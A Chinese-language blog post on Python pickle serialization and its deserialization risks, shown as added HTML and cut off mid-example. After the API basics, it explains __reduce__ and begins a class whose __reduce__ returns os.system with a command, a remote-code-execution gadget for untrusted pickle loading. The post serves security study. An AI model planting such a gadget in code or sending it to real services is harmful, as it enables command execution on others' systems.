@@ -1,0 +1,1821 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="sky123">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://skyi23.github.io/2025/08/11/pickle 反序列化/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/null" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/null">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/null">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Pickle 反序列化 | sky123&#39;s site
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                sky123&#39;s site
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/bookmarks/"
+                                        >
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                    书签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/bookmarks/"
+                        >
+                            <span>
+                                书签
+                            </span>
+                            
+                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">47</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Pickle 反序列化</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/icon.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-11 23:58:04</span>
+        <span class="mobile">2025-08-11 23:58:04</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-11 23:57:48</span>
+            <span class="mobile">2025-08-11 23:57:48</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/web/">web</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/web/python-web/">python web</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/python-web/">python web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>10.2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>47 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>在 Python 里，<strong>pickle</strong> 是一个用于 <strong>序列化（serialize）</strong> 和 <strong>反序列化（deserialize）</strong> Python 对象的模块。</p>
+<ul>
+<li><strong>序列化（pickling）</strong>：把内存中的 Python 对象转成<strong>字节串</strong>，方便<strong>存盘、传输、缓存</strong>。</li>
+<li><strong>反序列化（unpickling）</strong>：把字节串还原回<strong>等价的 Python 对象</strong>。</li>
+</ul>
+<p>它不仅能保存基础类型（int&#x2F;str&#x2F;list&#x2F;dict），还能处理<strong>自定义类实例</strong>、函数引用（受限制）、复杂容器等。pickle 是 <strong>Python 专用格式</strong>，不是跨语言的通用格式。</p>
+<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h2><p>Pickle 库提供了下面几种 API 用于序列化和反序列化：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>功能</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>pickle.dump(obj, file, protocol=...)</code></td>
+<td>序列化对象到文件</td>
+<td>文件需以 <code>&quot;wb&quot;</code> 打开</td>
+</tr>
+<tr>
+<td><code>pickle.dumps(obj, protocol=...)</code></td>
+<td>序列化对象为 bytes</td>
+<td>内存用</td>
+</tr>
+<tr>
+<td><code>pickle.load(file)</code></td>
+<td>从文件反序列化</td>
+<td>文件需以 <code>&quot;rb&quot;</code> 打开</td>
+</tr>
+<tr>
+<td><code>pickle.loads(bytes)</code></td>
+<td>从 bytes 反序列化</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>示例代码：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;scores&quot;</span>: [<span class="number">98</span>, <span class="number">87</span>, <span class="number">92</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 序列化 ---</span></span><br><span class="line">b = pickle.dumps(data)  <span class="comment"># → bytes</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.pkl&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(data, f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 反序列化 ---</span></span><br><span class="line">obj = pickle.loads(b)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.pkl&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    obj2 = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obj)</span><br><span class="line"><span class="built_in">print</span>(obj2)</span><br></pre></td></tr></table></figure></div>
+
+<p>另外像 <code>pickle.dumps</code> 这种序列化 API 中有一个 <code>protocol</code> 参数可以指定序列化的协议版本。这是因为 Pickle 有多个协议（protocol）版本，数字越大功能越强，性能越好，但可读性和兼容性差。</p>
+<ul>
+<li>0：文本格式，最兼容</li>
+<li>1：早期二进制协议</li>
+<li>2：支持新式类、效率提升</li>
+<li>3：Py3 默认，支持 <code>bytes</code></li>
+<li>4：支持大对象、<code>set</code>、<code>fronzenset</code> 等</li>
+<li>5：引入 <code>PickleBuffer</code>，支持 out-of-band buffer（零拷贝）</li>
+</ul>
+<p>我们可以观察到不同版本协议下序列化的结果是不同的：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a = &#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pickle.HIGHEST_PROTOCOL + <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>, pickle.dumps(a, protocol=i))</span><br><span class="line">    </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pickle版本0 b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span></span><br><span class="line"><span class="string">pickle版本1 b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line"><span class="string">pickle版本2 b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line"><span class="string">pickle版本3 b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line"><span class="string">pickle版本4 b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#x27;</span></span><br><span class="line"><span class="string">pickle版本5 b&#x27;\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>在手动构造 Payload 的时候我们通常选择协议 0，因为这个版本的协议是文本协议，可读性好且兼容性好。</p>
+
+    </div>
+  </div>
+
+<p><code>pickletools</code> 模块可以反汇编 pickle 字节流，看它包含哪些 opcode（方便安全审计）。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle, pickletools</span><br><span class="line"></span><br><span class="line">pickletools.dis(pickle.dumps(&#123;<span class="string">&quot;x&quot;</span>: <span class="number">1</span>&#125;, protocol=<span class="number">0</span>))</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="自定义序列化"><a href="#自定义序列化" class="headerlink" title="自定义序列化"></a>自定义序列化</h2><p>默认的 Pickle 会尝试用“类+构造参数+属性字典”把对象还原，但：</p>
+<ul>
+<li>有些类不容易自动还原（例如不可变类型、<code>__slots__</code>、需要构造器参数的对象）；</li>
+<li>你可能想<strong>压缩&#x2F;脱敏&#x2F;裁剪</strong>状态，或做<strong>版本迁移</strong>；</li>
+<li>你想<strong>明确控制</strong>“反序列化时调用哪个函数，用哪些参数，然后如何恢复属性”。</li>
+</ul>
+<p>因此 Pickle 提供了类的魔术方法可以支持自定义的序列化&#x2F;反序列化。</p>
+<h3 id="reduce-reduce-ex"><a href="#reduce-reduce-ex" class="headerlink" title="reduce &#x2F; reduce_ex"></a>reduce &#x2F; reduce_ex</h3><p><code>__reduce__</code> &#x2F; <code>__reduce_ex__(protocol)</code> 这两个方法告诉 pickle：“<strong>如何重建我</strong>”。它们需要<strong>返回</strong>一个 <strong>tuple</strong>，基本形态：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">callable</span>, args_tuple[, state[, listitems[, dictitems]]])</span><br></pre></td></tr></table></figure></div>
+
+<p>最常见的是前两位或前三位：</p>
+<ul>
+<li><code>callable</code>：反序列化时要被调用的可调用对象，通常是类的构造函数，或者你定义的一个工厂函数。</li>
+<li><code>args_tuple</code>：传给 <code>callable</code> 的参数元组，这些参数将用于重新构造对象。</li>
+<li><code>state</code>（可选）：对象的额外状态（通常是一个属性字典），用来恢复对象的内部状态。</li>
+</ul>
+<p>如果实现了 <code>__reduce__</code> 魔术方法，则 Pickle 反序列化等价于：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = <span class="built_in">callable</span>(*args_tuple)</span><br><span class="line"><span class="comment"># 如果提供了 state：</span></span><br><span class="line">obj.__setstate__(state)  <span class="comment"># 若存在</span></span><br><span class="line"><span class="comment"># 否则尝试 obj.__dict__.update(state)</span></span><br></pre></td></tr></table></figure></div>
+
+<ol>
+<li><p><strong><code>callable(*args_tuple)</code></strong> ：在反序列化时，<code>pickle</code> 会调用 <code>callable(*args_tuple)</code> 来创建一个新的对象。这个 <code>callable</code> 通常是类本身，而 <code>args_tuple</code> 是传给该类构造函数的参数。所以，反序列化实际上是通过类和构造函数参数来<strong>重建对象</strong>。</p>
+</li>
+<li><p><strong>恢复 <code>state</code></strong> ：如果 <code>__reduce__</code> 返回了一个 <code>state</code>（通常是一个字典），那么在创建好对象后，<code>pickle</code> 会尝试恢复对象的状态：</p>
+<ul>
+<li><p>如果对象实现了 <code>__setstate__(state)</code> 方法，<code>pickle</code> 会调用该方法，这是常见的恢复对象状态的方式。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.__setstate__(state)</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>如果没有 <code>__setstate__</code> 方法，<code>pickle</code> 会通过 <code>obj.__dict__.update(state)</code> 来手动更新对象的属性字典，从而恢复状态。</p>
+</li>
+</ul>
+<p>这里的 <code>state</code> 主要是对象的<strong>内部属性</strong>，例如 <code>self.__dict__</code>，通常在序列化时提取，或者是自定义的状态数据。</p>
+</li>
+</ol>
+
+  <div class="note-large blue">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>提示</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <ul>
+<li><p><code>_reduce_ex__(protocol)</code> 比 <code>__reduce__</code> <strong>优先</strong>。如果类实现了 <code>__reduce_ex__</code>，那么 pickle 会优先调用它；如果没有实现 <code>__reduce_ex__</code>，则会回退到调用 <code>__reduce__</code>。</p>
+</li>
+<li><p>Pickle 序列化时将 <code>__reduce__</code> 返回的元组（通常是 <code>(callable, args_tuple)</code>）写入数据流，反序列化时根据这个元组调用 <code>callable(*args_tuple)</code> 来重建对象。这样，pickle 在反序列化时更具灵活性，但也带来了潜在的安全风险，因为它不仅还原数据，还可能执行某些逻辑。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义类，定义 __reduce__ 方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CommandExecutor</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, command</span>):</span><br><span class="line">        <span class="variable language_">self</span>.command = command</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 返回值是 (callable, args_tuple)，会在反序列化时调用</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="variable language_">self</span>.command,))  <span class="comment"># os.system 执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 CommandExecutor 